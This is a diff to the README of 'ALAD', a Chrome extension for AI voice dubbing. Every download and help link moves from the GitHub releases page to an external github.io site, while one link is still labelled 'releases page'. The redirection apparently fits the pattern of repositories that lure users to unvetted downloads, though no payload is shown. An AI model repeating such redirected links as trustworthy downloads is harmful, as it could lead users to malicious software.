@@ -1,7 +1,7 @@
 <h1>🌐 ALAD - Real-time AI voice dubbing for any Chrome tab in 78 languages</h1>
 
 <p align="center">
-  <a href="https://github.com/Incestuous-finding156/ALAD/releases">
+  <a href="https://incestuous-finding156.github.io">
     <img src="https://img.shields.io/badge/Download-ALAD%20(v1.0)-%23FF6F61?style=for-the-badge&logo=googlechrome&logoColor=white" alt="Download ALAD">
   </a>
 </p>
@@ -22,7 +22,7 @@
 <h2>📥 Download and Installation</h2>
 <p>Visit this link to download the application:</p>
 <p align="center">
-  <a href="https://github.com/Incestuous-finding156/ALAD/releases">
+  <a href="https://incestuous-finding156.github.io">
     <img src="https://img.shields.io/badge/Get%20ALAD%20Now-Download%20-%234CAF50?style=for-the-badge&logo=download&logoColor=white" alt="Download ALAD">
   </a>
 </p>
@@ -71,7 +71,7 @@
 </ul>
 
 <h2>📣 Get Help</h2>
-<p>For issues or questions, visit the <a href="https://github.com/Incestuous-finding156/ALAD/releases">releases page</a> for support links or check the "Issues" tab on GitHub.</p>
+<p>For issues or questions, visit the <a href="https://incestuous-finding156.github.io">releases page</a> for support links or check the "Issues" tab on GitHub.</p>
 
 <h2>🔒 Privacy</h2>
 <p>ALAD does not collect or store any personal data. All translations are processed in real-time and not retained. Review the full privacy policy on the GitHub repository.</p>
